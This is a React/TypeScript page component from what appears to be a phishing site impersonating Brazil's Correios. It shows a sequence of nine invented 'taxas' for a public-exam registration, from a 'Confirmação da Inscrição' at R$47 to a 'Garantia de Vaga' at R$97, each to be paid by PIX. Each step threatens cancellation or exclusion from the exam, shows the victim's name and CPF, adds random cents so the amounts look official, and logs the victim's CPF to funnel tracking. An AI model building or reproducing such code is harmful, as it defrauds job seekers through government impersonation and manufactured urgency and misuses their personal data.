import { useEffect } from "react";
import { useNavigate, useLocation, useParams } from "react-router-dom";
import { FileCheck, FileText, Shield, MapPin, CreditCard, Fingerprint, BookOpen, CheckSquare, Star } from "lucide-react";
import { Button } from "@/components/ui/button";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import { CPFData } from "@/lib/cpf";
import { getSession, saveSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const UPSELL_INFO = [
  { title: "Confirmação da Inscrição", valor: 47, icon: FileCheck, headline: "SUA INSCRIÇÃO PRECISA SER CONFIRMADA", items: ["Confirmação do seu nome na lista oficial", "Reserva da sua vaga no concurso", "Geração do comprovante de inscrição", "Envio da confirmação por e-mail"], nota: "Sem a confirmação, sua inscrição será CANCELADA automaticamente." },
  { title: "Escolha do Local de Prova", valor: 37, icon: MapPin, headline: "ESCOLHA ONDE VOCÊ VAI FAZER A PROVA", items: ["Prova no local mais próximo de você", "Sala com acessibilidade garantida", "Você recebe o endereço por e-mail e SMS", "Prioridade na escolha"], nota: "Quem não paga essa taxa vai pra onde sobrar vaga." },
  { title: "Cartão de Acesso à Prova", valor: 39, icon: CreditCard, headline: "VOCÊ PRECISA DO CARTÃO PRA ENTRAR NA PROVA", items: ["Documento com seu nome, foto e local da prova", "QR Code pra entrada rápida", "Versão digital no celular", "Dados da sua sala e horário"], nota: "ATENÇÃO: Sem o Cartão de Acesso, você será IMPEDIDO de fazer a prova." },
  { title: "Seguro do Candidato", valor: 27, icon: Shield, headline: "PROTEJA SEU DINHEIRO — SEGURO DO CANDIDATO", items: ["Reembolso de 100% se o concurso cancelar", "Cobertura se a prova for adiada", "Proteção contra erro no sistema", "Suporte jurídico se precisar"], nota: "Sem o seguro, você perde tudo que pagou se o concurso for cancelado." },
  { title: "Apostila Digital Oficial", valor: 33, icon: BookOpen, headline: "MATERIAL DE ESTUDO OFICIAL DO CONCURSO", items: ["Conteúdo completo de todas as matérias", "Questões comentadas de provas anteriores", "Resumos e mapas mentais", "Acesso imediato após pagamento"], nota: "Quem estuda com material oficial tem mais chance de passar." },
  { title: "Simulado Online da Banca", valor: 24, icon: FileText, headline: "SIMULADO IDÊNTICO À PROVA REAL", items: ["Mesmo tempo e formato da prova", "Correção automática com gabarito", "Ranking com outros candidatos", "Pode refazer quantas vezes quiser"], nota: "Você vai saber exatamente como vai ser no dia e não vai ter surpresa." },
  { title: "Certificado de Pré-Aprovação", valor: 19, icon: Fingerprint, headline: "COMPROVE QUE VOCÊ ESTÁ APTO A FAZER A PROVA", items: ["Certificado com seus dados e protocolo", "Pode usar pra justificar falta no trabalho", "Comprova que você é candidato oficial", "Válido como documento"], nota: "Use como comprovante pra pedir folga no dia da prova." },
  { title: "Acompanhamento por SMS e E-mail", valor: 15, icon: CheckSquare, headline: "RECEBA TODOS OS AVISOS DO CONCURSO", items: ["Alerta de mudança de data ou local", "Gabarito no dia da prova", "Resultado antes de todo mundo", "Avisos importantes por SMS"], nota: "Quem não se cadastra, perde prazo e perde vaga." },
  { title: "Garantia de Vaga na Região", valor: 97, icon: Star, headline: "ÚLTIMA ETAPA — GARANTA SUA VAGA", items: ["Trabalhe na agência mais perto de você", "Prioridade total na escolha da cidade", "Acompanhamento VIP do processo", "Inscrição 100% concluída"], nota: "ATENÇÃO: Esta é a última taxa. Após o pagamento, sua inscrição estará 100% CONCLUÍDA." },
];

const UpsellInfo = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { step } = useParams<{ step: string }>();

  const parsedStep = parseInt(step || "1", 10);
  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 9);
  const currentIndex = stepNumber - 1;
  const info = UPSELL_INFO[currentIndex];

  const valorComCentavos = info.valor + (Math.floor(Math.random() * 99) + 1) / 100;

  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;

  useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: `/upsell-info/${stepNumber}`, valorBeneficio, protocolo });
    trackFunnelEvent(`upsell-info-${stepNumber}`, { cpf: cpfData.cpf });
  }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);

  const handlePagar = () => {
    navigate(buildUrlWithUtm(`/upsell/${stepNumber}`), { state: { cpfData, valorBeneficio, protocolo } });
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Inscrição > Taxas" />

      <main className="flex-1 px-4 py-6 sm:py-8">
        <div className="max-w-lg mx-auto space-y-5">

          <h1 className="titulo-institucional text-lg">{info.headline}</h1>

          {/* Items table */}
          <table className="tabela-zebra">
            <thead>
              <tr><th>Detalhamento da Taxa</th></tr>
            </thead>
            <tbody>
              {info.items.map((item, i) => (
                <tr key={i}><td>{item}</td></tr>
              ))}
            </tbody>
          </table>

          {/* Candidato */}
          <table className="tabela-zebra">
            <thead><tr><th colSpan={2}>Dados do Candidato</th></tr></thead>
            <tbody>
              <tr><td className="font-semibold w-1/3">Candidato</td><td>{cpfData.nome}</td></tr>
              <tr><td className="font-semibold">CPF</td><td>{cpfData.cpf}</td></tr>
            </tbody>
          </table>

          {/* Observação */}
          <div className="text-xs text-muted-foreground space-y-1">
            <p className="font-semibold text-destructive">⚠ IMPORTANTE:</p>
            <p>• {info.nota}</p>
            <p>• Pagamento via PIX com confirmação instantânea.</p>
          </div>

          {/* Valor */}
          <div className="rounded border-2 border-destructive bg-destructive/10 p-4 text-center space-y-1">
            <p className="text-sm font-semibold text-foreground">Valor da Taxa</p>
            <p className="text-3xl font-black text-primary">
              R$ {valorComCentavos.toFixed(2).replace('.', ',')}
            </p>
          </div>

          <Button onClick={handlePagar} className="w-full h-12 text-sm font-bold">
            PAGAR TAXA AGORA
          </Button>

          <p className="text-[10px] text-center text-destructive font-semibold">
            O não pagamento desta taxa pode resultar no cancelamento da inscrição.
          </p>
        </div>
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default UpsellInfo;
